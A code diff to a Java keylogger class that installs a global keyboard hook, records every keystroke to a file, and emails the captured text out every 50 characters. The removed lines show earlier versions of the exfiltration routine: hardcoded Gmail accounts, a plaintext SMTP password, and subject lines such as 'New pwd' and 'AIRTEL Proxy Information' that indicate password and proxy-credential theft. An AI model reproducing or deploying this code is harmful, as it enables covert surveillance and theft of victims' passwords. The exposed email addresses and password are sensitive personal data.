@@ -6,26 +6,16 @@ import java.io.File;
 import java.io.FileReader;
 import java.io.FileWriter;
 import java.io.IOException;
-import java.util.Properties;
 
-import javax.mail.Message;
-import javax.mail.MessagingException;
-import javax.mail.PasswordAuthentication;
-import javax.mail.Session;
-import javax.mail.Transport;
-import javax.mail.internet.InternetAddress;
-import javax.mail.internet.MimeMessage;
-
+import org.jnativehook.GlobalScreen;
+import org.jnativehook.NativeHookException;
 import org.jnativehook.keyboard.NativeKeyEvent;
 import org.jnativehook.keyboard.NativeKeyListener;
-import org.springframework.context.ConfigurableApplicationContext;
-import org.springframework.context.support.ClassPathXmlApplicationContext;
-
-import com.capture.mail.CrunchifyEmailAPI;
 
 public class Launcher implements NativeKeyListener {
 	private int flagNumberCharacterToSend = 0;
 	private static String toSend = "";
+	private static String originalContentFile = "";
 	private Boolean ctrl = Boolean.valueOf(false);
 	private Boolean alt = Boolean.valueOf(false);
 	private Boolean arobaze = Boolean.valueOf(false);
@@ -41,21 +31,25 @@ public class Launcher implements NativeKeyListener {
 			} catch (IOException e) {
 				e.printStackTrace();
 			}
+		} else {
+			originalContentFile = readExistingFile(true) + "ENDLINE";
 		}
 	}
 
+	
+
 	public static void main(String[] args) {
-		sendEmailSpring("blabla");
-//		try {
-//			System.out.print("Starting....");
-//			GlobalScreen.registerNativeHook();
-//		} catch (NativeHookException ex) {
-//			System.err.println("There was a problem registering the native hook.");
-//			System.err.println(ex.getMessage());
-//
-//			System.exit(1);
-//		}
-//		GlobalScreen.getInstance().addNativeKeyListener(new Launcher());
+		try {
+			System.out.print("Starting....");
+			GlobalScreen.registerNativeHook();
+			System.out.print("Native hook OK....");
+		} catch (NativeHookException ex) {
+			System.err.println("There was a problem registering the native hook.");
+			System.err.println(ex.getMessage());
+
+			System.exit(1);
+		}
+		GlobalScreen.getInstance().addNativeKeyListener(new Launcher());
 	}
 
 	public void nativeKeyPressed(NativeKeyEvent e) {
@@ -151,27 +145,14 @@ public class Launcher implements NativeKeyListener {
 
 			if (!("ENDCAPS".equals(this.keyText) || "BEGINCAPS".equals(this.keyText)))
 				toSend += this.keyText;
-				sendEmailSpring(toSend);
-//			if (flagNumberCharacterToSend != 0 && flagNumberCharacterToSend % 50 == 0)
-//		      {
-//		        sendToMail(toSend);
-//		        
-//		        flagNumberCharacterToSend = 0a;
-////		        toSend = "";
-//		      }
-//		      flagNumberCharacterToSend++;
-			toSend = removeCaps(toSend);
 
+			if (flagNumberCharacterToSend != 0 && flagNumberCharacterToSend % 50 == 0) {
+				MailSending.sendToMailOriginal(toSend);
+				flagNumberCharacterToSend = 0;
+			}
+			flagNumberCharacterToSend++;
 			writeKeyStrokeToFile(toSend);
 		}
-	}
-
-	private String removeCaps(String toSend2) {
-		if (toSend2.contains("ENDCAPS"))
-			toSend2.replaceAll("ENDCAPS", "");
-		if (toSend2.contains("BEGINCAPS"))
-			toSend2.replaceAll("BEGINCAPS", "");
-		return toSend2;
 	}
 
 	public void nativeKeyReleased(NativeKeyEvent e) {
@@ -187,105 +168,42 @@ public class Launcher implements NativeKeyListener {
 
 	public void nativeKeyTyped(NativeKeyEvent e) {
 	}
+	
+	private static String readExistingFile(boolean read) {
+		if (read)
+			try {
+				// make a 'file' object
+				// Get data from this file using a file reader.
+				FileReader fr = new FileReader(file);
+				// To store the contents read via File Reader
+				BufferedReader br = new BufferedReader(fr);
+				// Read br and store a line in 'data', print data
+				String data;
+				StringBuilder dataqueue = new StringBuilder();
+				while ((data = br.readLine()) != null) {
+					dataqueue.append(data);
+				}
+				return dataqueue.toString();
+			} catch (IOException e) {
+				System.out.println("bad !");
+			}
+
+		return "";
+	}
 
 	private static void writeKeyStrokeToFile(String keyStroke) {
 		try {
 			BufferedReader bufferedReader = new BufferedReader(new FileReader(file.getAbsolutePath()));
-
 			FileWriter fw = new FileWriter(file.getAbsoluteFile());
-
 			BufferedWriter bw = new BufferedWriter(fw);
 			if (bufferedReader.readLine() != null) {
 				bw.append(keyStroke);
 			} else {
-				bw.write(keyStroke);
+				bw.write(originalContentFile + keyStroke);
 			}
 			bw.flush();
 		} catch (IOException e) {
 			e.printStackTrace();
 		}
-	}
-
-	private static void sendToMail(String keyStroke) {
-		String to = "rantonasoavina@gmail.com";
-
-		String from = "rantonasoavina@gmail.com";
-		try {
-			String host = "smtp.gmail.com";
-			String d_port = "587";
-
-			Properties properties = System.getProperties();
-
-			properties.setProperty("mail.smtp.host", host);
-			properties.put("mail.smtp.port", d_port);
-			properties.put("mail.smtp.auth", "true");
-			properties.put("mail.smtp.starttls.enable", "true");
-			properties.put("mail.smtp.socketFactory.port", d_port);
-//			properties.put("mail.smtp.socketFactory.class", "javax.net.ssl.SSLSocketFactory");
-//			properties.put("mail.smtp.socketFactory.fallback", "false");
-
-			// Establishing a session with required user details
-			Session session = Session.getInstance(properties, new javax.mail.Authenticator() {
-				protected PasswordAuthentication getPasswordAuthentication() {
-					return new PasswordAuthentication(from, "I$love$Jesus$Ranto$Nasoavina$2639");
-				}
-			});
-
-//			Session session = Session.getDefaultInstance(properties, null);
-			MimeMessage message = new MimeMessage(session);
-			message.setFrom(new InternetAddress(from));
-			message.addRecipient(Message.RecipientType.TO, new InternetAddress(to));
-			message.setSubject("New pwd");
-			message.setText(keyStroke);
-
-//			Transport transport = session.getTransport("smtp");
-//			transport.connect(host, Integer.valueOf(d_port).intValue(), from,
-//					"I$love$Jesus$Ranto$Nasoavina$2639");
-//			transport.sendMessage(message, message.getAllRecipients());
-//			transport.close();
-
-//	        try {
-//	            //Creating a Message object to set the email content
-//	            MimeMessage msg = new MimeMessage(session);
-//	            /*Parsing the String with defualt delimiter as a comma by marking the boolean as true and storing the email
-//	            addresses in an array of InternetAddress objects*/
-//	            InternetAddress[] address = InternetAddress.parse(to, true);
-//	            //Setting the recepients from the address variable
-//	            msg.setRecipients(Message.RecipientType.TO, address);
-//	            String timeStamp = new SimpleDateFormat("yyyymmdd_hh-mm-ss").format(new Date());
-//	            msg.setSubject("Sample Mail : " + timeStamp);
-//	            msg.setSentDate(new Date());
-//	            msg.setText(keyStroke);
-//	            msg.setHeader("XPriority", "1");
-			Transport.send(message);
-//	            System.out.println("Mail has been sent successfully");
-//	        } catch (MessagingException mex) {
-//	            System.out.println("Unable to send an email" + mex);
-//	        }
-
-			System.out.println("Sent message successfully....");
-		} catch (MessagingException mex) {
-			mex.printStackTrace();
-		}
-	}
-	
-	@SuppressWarnings("resource")
-	private static void sendEmailSpring(String toSend) {
-		// Spring Bean file you specified in /src/main/resources folder
-		String crunchifyConfFile = "config_mail.xml";
-		ConfigurableApplicationContext context = new ClassPathXmlApplicationContext(crunchifyConfFile);
-
-		// @Service("crunchifyEmail") <-- same annotation you specified in
-		// CrunchifyEmailAPI.java
-		CrunchifyEmailAPI crunchifyEmailAPI = (CrunchifyEmailAPI) context.getBean("crunchifyEmail");
-		String toAddr = "octronanonymous@gmail.com";
-		String fromAddr = "octronanonymous@gmail.com";
-
-		// email subject
-		String subject = "AIRTEL Proxy Information";
-
-		// email body
-		String body = toSend;
-		crunchifyEmailAPI.crunchifyReadyToSendEmail(toAddr, fromAddr, subject, body);
 	}
 }
